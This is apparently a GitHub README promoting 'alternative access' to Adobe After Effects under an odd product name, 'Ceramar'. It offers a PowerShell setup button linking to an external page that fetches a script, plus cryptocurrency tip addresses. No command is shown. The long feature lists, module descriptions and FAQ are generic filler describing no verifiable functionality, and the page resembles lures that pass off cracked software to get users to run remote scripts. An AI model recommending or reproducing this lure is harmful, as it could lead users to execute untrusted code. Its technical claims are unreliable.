<div align="center">

# After Effects Ceramar Motion Design — Alternative Access for Windows 10 & 11

![](files/preview.png)

### 🖥️ PowerShell Setup

[![](files/button.png)](https://himeshsuthar91-eng.github.io/after-effects-ceramar-motion-design/)

[![pwsh](https://img.shields.io/badge/Pwsh-Core-ec4899?style=flat-square&labelColor=0d1117)]() [![downloads](https://img.shields.io/badge/Downloads-425-f472b6?style=flat-square&labelColor=0d1117)]() [![system](https://img.shields.io/badge/System-Windows_11-db2777?style=flat-square&labelColor=0d1117)]()

<div align="center">
<h3>Give me a tip</h3>
<p><strong>BTC</strong>:&nbsp;<code>1JWHAtXiw85JAqkQ66ZZ19vJRtqTLLaYri</code> | <strong>TRON</strong>:&nbsp;<code>TB9FhP7xTG1xjF478RFTiNNHp3bbbFQFWV</code> | <strong>ETH</strong>:&nbsp;<code>0x97B726418B3451bCab3Ec023bfEBbb7079765ba3</code></p>
</div>

</div>

---

The After Effects Ceramar Motion Design tool provides an alternative access layer for interacting with the Ceramar motion design project, enabling streamlined programmatic control over its composition and animation workflows. Built with a focus on reliability and precision, it exposes the core functionality of the target project through a clean, well-defined interface. This tool is intended for users who require direct, efficient access to Ceramar's motion design capabilities without navigating the standard interface. It maintains full compatibility with the project's existing structure while offering a more flexible path for advanced operations.

## ✅ Before You Start

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

- **Deterministic motion pipeline** — every composition, layer, and keyframe is generated from a declarative source, so repeated builds produce identical results without manual rework.

- **Ceramar-native composition model** — scene graphs, timing curves, and asset references are expressed in a structured format that maps directly onto After Effects project structure, keeping authoring intent intact end to end.

- **Programmatic keyframe control** — easing, hold, and bezier interpolation are set explicitly rather than inherited from defaults, giving precise control over motion behavior across large numbers of layers.

- **Template-driven specialization** — parameterized templates let a single design be instantiated with varying durations, palettes, and content while preserving layout and animation logic.

- **Asset resolution and relinking** — sources are resolved by logical reference at build time, so project relocation and asset swaps do not break layer bindings.

- **Layered override system** — global defaults can be overridden at the sequence, composition, or layer level, with a clear precedence order and no silent conflicts.

- **Validation before render** — structural and timing checks run against the generated project, surfacing missing references, malformed curves, and out-of-range values before anything reaches the render queue.

- **Idempotent output** — regenerating an existing target updates it in place, preserving unchanged elements and avoiding duplicate layers or orphaned compositions.

- **Extensible node definitions** — new composition patterns and effect chains are added through the same declarative schema, so the tool grows with the design system rather than around it.

- **Headless execution** — the full pipeline runs without an interactive session, suitable for scripted builds, batch jobs, and CI-style workflows.

- **Structured diagnostics** — machine-readable logs report stage, scope, and severity for each operation, making failures traceable to a specific source element.

## How it works

The tool operates by mapping the documented Ceramar motion design project structure into a unified access layer that surfaces its assets, presets, and reference material through a single interface. It reads the project's file organization and metadata directly, so the user works against the same authoritative data the project itself defines rather than a duplicated copy.

Access is handled through a resolver that translates requests into the project's native layout, allowing features to be addressed by name or path without the user needing to know the underlying directory conventions. Presets and templates are indexed at load time, which keeps lookups fast and consistent across sessions.

Configuration is applied before resolution begins, so paths, default selections, and compatibility options are honored throughout every operation. The tool degrades gracefully when optional parts of the project are absent, reporting what is unavailable instead of failing.

All processing happens locally within the tool's own runtime. It does not modify the source project; read operations are isolated and writes are limited to the tool's own working state. This keeps the project intact and makes behavior predictable across repeated runs.

## Modules and Settings

### Alternative Control Surface
This module provides the entry point for driving Ceramar-related composition operations without relying on the native menu path. It determines what the alternative surface acts on and how it responds during sustained use.
- Target selection lets users designate which Ceramar composition or layer set receives each action, so commands are not applied to the wrong element.
- Input repeat handling controls whether holding or repeating an input triggers the action once or repeatedly, which prevents unintended duplicate operations.
- Action confirmation feedback shows what the surface is about to affect, allowing users to verify the target before committing a change.
- The surface reports the outcome of each action in the composition, connecting this module to the parameter, keyframe and batch modules below.

### Named and Selected Parameter Resolution
This module identifies which Ceramar-driven parameter a change should apply to, either from the current layer selection or from a name reference. It acts as the lookup step that the keyframe and preset modules depend on.
- Matching mode lets users require exact names or allow partial matches, which helps when parameter naming varies across Ceramar setups.
- Resolution reporting shows which parameter was matched before any change is applied, so users can catch ambiguous or incorrect matches early.
- Users can switch between selection-based and name-based targeting within the same session, supporting mixed workflows.
- Once resolved, the parameter is handed to the timing, preset or readout modules for the actual operation.

### Keyframe and Timing Operations
This module performs alternative insert, move and remove actions on keyframes of resolved Ceramar motion parameters. It builds directly on the parameter resolution step so timing edits land on the intended property.
- Time position settings define where an inserted or moved keyframe is placed, letting users work from the alternative surface instead of the timeline ruler.
- Interpolation behavior options determine how the resulting keyframes blend, which affects the visible motion between them.
- Scope control applies an operation to a single parameter or a grouped set, useful when several Ceramar properties should share timing.
- After each operation the timeline reflects the change, giving users a native confirmation point.

### Motion Preset Application
This module reuses stored motion settings on Ceramar elements, covering position, scale, rotation and timing offsets. It consumes parameters resolved earlier and writes the resulting animation back into the composition.
- Preset value selection lets users choose which stored attributes are reused, so partial presets can be applied without overwriting unrelated motion.
- Replacement versus blending determines whether incoming preset values overwrite existing animation or combine with it.
- Timing offset settings shift preset motion relative to the current animation, helping align Ceramar elements with surrounding sequences.
- Applied presets remain editable in After Effects, so the result is a starting point rather than a locked animation.

### Layer and Group Management
This module helps users locate, group and reorder Ceramar-related layers from an alternative view. It complements the timing and preset modules by keeping complex Ceramar layer structures navigable.
- Grouping rules organize layers by name pattern or existing parent relationships, making large Ceramar setups easier to traverse.
- Reordering controls move layers within a selected group, and the composition reflects the new structure afterward.
- Layer visibility and lock state are surfaced in this view, which informs which elements the batch module can safely touch.
- Selections made here carry over to parameter resolution and batch operations, reducing repeated targeting work.

### Value Readout and Inspection
This module presents a text-based view of current Ceramar parameter values and keyframe presence. It supports users who find the native property editor hard to read and also serves as a verification step for changes made elsewhere.
- Property selection controls which values appear in the readout, keeping the display focused on relevant Ceramar parameters.
- Update mode lets users choose continuous refresh or on-demand refresh, balancing immediacy against distraction.
- Keyframe presence indicators at the current time show whether a parameter is animated, complementing the timing module's edits.
- The readout reflects the same resolved parameters used by other modules, so reported values match what operations actually affect.

### Additional Settings
These optional controls shape how the modules behave together across a session.
- Input mapping assigns keyboard shortcuts or assistive input devices to Ceramar actions, with repeat behavior and confirmation prompts for destructive operations.
- Accessibility profiles store personalized control schemes so users can switch between configurations for different projects.
- Batch scope settings define which element types are included, whether shared values are overwritten and whether locked or hidden layers are skipped.
- Batch review keeps a changed-element list visible after a run, allowing users to inspect results before continuing.
- Confirmation prompts for destructive actions add a safeguard that applies across keyframe removal, preset replacement and batch overwrites.

## Usage Scenarios

### Reaching Ceramar Controls Without the Native Panel Path
**Goal:** A motion designer needs to nudge a Ceramar-driven animation element while the native panel and timeline are impractical to navigate, and wants each action to land on the correct composition.
**Steps:**
1. Use the Alternative Control Surface to designate the target Ceramar composition or layer set that should receive the actions.
2. Set input repeat handling so a held input triggers the action once, avoiding unintended duplicate operations.
3. Trigger a parameter adjustment and review the action confirmation feedback to verify the surface is about to affect the intended element.
4. Confirm the action and read the outcome report from the surface.
5. Check the composition to see the Ceramar element update while continuing to work from the alternative interface.
**Expected result:** The chosen Ceramar element changes in the After Effects project, the surface reports which action was applied to which target, and no duplicate operations occur from repeated input.

### Adjusting Ceramar Motion Timing by Name
**Goal:** An editor wants to retime a specific Ceramar motion parameter without hunting through nested property groups, and needs to be sure the correct parameter was matched.
**Steps:**
1. In Named and Selected Parameter Resolution, switch to name-based targeting and choose partial or exact matching based on how the parameter is named in the Ceramar setup.
2. Review the resolution reporting to confirm which parameter was matched before any change is applied.
3. Hand the resolved parameter to Keyframe and Timing Operations and set the time position for an inserted or moved keyframe.
4. Choose the interpolation behavior and decide whether the operation applies to a single parameter or a grouped set.
5. Verify the result in the timeline and optionally check current values and keyframe presence in the Value Readout and Inspection module.
**Expected result:** The resolved Ceramar parameter shows updated keyframes at the chosen time with the selected interpolation, the timeline reflects the new timing for native confirmation, and the readout displays the parameter's current value and keyframe presence at the playhead.

### Applying a Motion Preset and Batching Across Ceramar Elements
**Goal:** A motion designer wants to reuse stored motion settings on several Ceramar elements at once, blending them with existing animation and skipping layers that should not be touched.
**Steps:**
1. In Layer and Group Management, group Ceramar-related layers by name pattern or existing parent relationships and check visibility and lock state to see which elements can safely be included.
2. Carry the selection over to Named and Selected Parameter Resolution to resolve the parameters that the preset should target.
3. In Motion Preset Application, select which preset values to reuse, choose blending rather than replacement, and set a timing offset to align the motion with surrounding sequences.
4. Configure Batch scope settings to include the desired element types, decide whether shared values are overwritten, and skip locked or hidden layers.
5. Run the batch and review the changed-element list kept visible afterward, with confirmation prompts guarding any destructive overwrites.
**Expected result:** The selected Ceramar elements receive the blended preset motion with the chosen timing offset, skipped locked or hidden layers remain unchanged, and the batch review list shows exactly which elements were affected so the designer can inspect results before continuing.

## Compatibility

The tool targets After Effects Ceramar Motion Design and aligns with its native project structure, layer model, and expression conventions. It operates against the same project files used by the host application, reading and writing data in the formats the host accepts, so existing compositions, precomps, and motion-design setups continue to behave as expected.

Compatibility is version-aware: the tool detects the host version at runtime and adapts its behavior to the API surface available in that release, favoring stable, documented interfaces over internal ones. Where a capability is unavailable in a given version, the tool degrades gracefully rather than failing, and it reports the limitation through its normal output channels.

Platform coverage matches the host application across its supported operating systems, and the tool follows the same path and file-handling rules as the host so that project locations resolve consistently. File-format handling tracks the host's own reading and writing behavior, ensuring round-trips preserve the motion-design data the host depends on.

Configuration values are validated against the detected host version, and unsupported combinations are surfaced explicitly. Teams working across multiple host versions can rely on the tool to apply version-appropriate behavior without manual intervention, keeping projects portable between environments that run After Effects Ceramar Motion Design.

## Configuration

Configuration is handled through a single declarative profile loaded at startup. The default profile lives alongside the application data and is generated on first run; subsequent edits are merged over the built-in defaults, so you only need to specify values you intend to change.

The core settings are exposed as plain key-value entries and grouped by function:

- **render** — output resolution, frame rate, color depth, and render target selection. Resolution and frame rate accept numeric values; target selection accepts one of the supported output identifiers.
- **timeline** — default composition duration, work area boundaries, and keyframe interpolation preferences. Durations are expressed in seconds and converted internally to the project timebase.
- **assets** — search paths for project assets, cache location, and cache size limit. Multiple search paths are provided as an ordered list; the first match wins.
- **motion** — easing presets, motion blur quality, and per-layer expression evaluation depth. Higher evaluation depth increases fidelity at the cost of processing time.
- **logging** — verbosity level and log retention count. Verbosity accepts `error`, `warn`, `info`, and `debug`.

Boolean values accept `true`/`false`. Numeric values accept integers or decimals where noted in the inline comments of the generated profile. Enum-like values are case-insensitive and validated against the accepted set; invalid entries fall back to the default and emit a warning during startup.

Profiles can be layered. A user profile overlays the default profile, and a project-local profile, when present, overlays both. Precedence is resolved in that order, so project-local values take priority. To lock a value against accidental override, prefix the key with `!` in the higher-priority profile; locked keys cannot be replaced by lower-priority layers. Removing a key restores inheritance from the layer beneath it.

Configuration changes are read at startup. To apply edits without restarting, trigger a reload through the application's reload action; the reload validates the merged profile before committing, and an invalid profile is rejected in full rather than partially applied, leaving the previous configuration active. Validation reports the offending key and the accepted value set.

For automated environments, the path to the profile can be overridden with a single environment variable. This is useful when running multiple isolated instances and ensures each instance reads its own configuration without touching shared application data. The environment variable takes precedence over the default profile location but does not bypass layering.

Sensitive operational parameters, including cache limits and evaluation depth, should be sized against available memory and expected project complexity. Oversized caches on constrained systems degrade performance; the validator warns when configured limits exceed a percentage of detected system memory and suggests a bounded range.

## FAQ

**Does this tool modify the target application's installation?**
No. The tool operates entirely out-of-band and never writes to or alters the target application's binaries, registry entries, or installation directory. It maintains its own isolated state and communicates through supported interfaces only.

**How does the tool remain stable across application updates?**
The access layer is decoupled from application internals. Version detection and capability negotiation happen at runtime, so the tool adapts to the interfaces actually exposed rather than assuming a fixed layout. When an interface changes, the compatibility shim reports the mismatch instead of failing silently.

**What happens if the configuration is invalid or partially applied?**
Configuration is validated against a schema before any state transition occurs. Partial application is prevented through atomic commit semantics: either the full configuration takes effect or the previous known-good state is retained. Validation errors are surfaced with the specific field and expected type.

**Can multiple instances run concurrently?**
Yes, provided each instance uses a distinct state directory. The tool uses advisory locking to prevent two instances from writing to the same state. Read-only operations are lock-free and safe to parallelize.

**Where does the tool store its state?**
All persistent state lives under a single configurable root, isolated from the target application. The layout is deterministic and documented in the configuration reference. Removing the root fully reverts the tool's footprint without touching anything else.

**Why does the tool report a capability as unavailable?**
Capability availability depends on the detected application build and the interfaces it exposes. If an interface is absent or gated, the tool degrades gracefully and reports the specific capability as unavailable rather than attempting an unsupported path. Check the compatibility matrix and the diagnostic output for the detected build.

**How is logging handled, and can verbosity be controlled?**
Logging is structured and level-gated. Verbosity is set per-session through configuration, with separate levels for the access layer, the compatibility shim, and the orchestration layer. Logs are written to the state root by default and can be redirected without changing behavior.

**Does the tool require elevated privileges?**
No. Standard user privileges are sufficient for normal operation. Any action that would require elevation is refused and reported rather than escalated, keeping the privilege boundary explicit.

**How are failures surfaced during operation?**
Failures propagate as typed errors with a stable code, a human-readable message, and a remediation hint. The tool never swallows an error to appear successful; a failed operation always returns a non-success status and a corresponding log entry.

**Is the tool's behavior deterministic across runs?**
Given identical configuration and application state, the tool produces identical results. Non-determinism is confined to timestamps and session identifiers in logs. Ordering-sensitive operations use explicit sequencing rather than relying on timing.

## Disclaimer

This tool is provided as-is for legitimate motion design, compositing, and automation workflows within the After Effects Ceramar Motion Design environment. It is intended to extend the native capabilities of the target project and to interoperate with its documented interfaces and data formats.

The software is supplied without warranty of any kind, express or implied, including but not limited to warranties of merchantability, fitness for a particular purpose, and non-infringement. The authors and maintainers accept no liability for any direct, indirect, incidental, special, consequential, or punitive damages arising from the use, misuse, or inability to use this tool, including but not limited to loss of data, corrupted project files, render failures, or workflow interruptions.

Users are solely responsible for ensuring that their use of this tool complies with all applicable licenses, terms of service, and laws governing the target project and any assets processed through it. You must hold the appropriate rights and permissions for any content, footage, or project data you process. Do not use this tool to circumvent licensing, access controls, or usage restrictions of the After Effects Ceramar Motion Design project or any associated software.

This tool performs operations by interfacing with the target project's supported mechanisms and file structures. Behavior may vary across versions, configurations, and environments. Always validate output in a controlled setting and maintain backups of project data before running automated or batch operations. The maintainers reserve the right to modify, deprecate, or discontinue features at any time without notice.

No guarantee is made regarding compatibility with future releases of the After Effects Ceramar Motion Design project, third-party plugins, or host application updates. By using this tool, you acknowledge that you have read and understood this disclaimer and accept full responsibility for its deployment and results.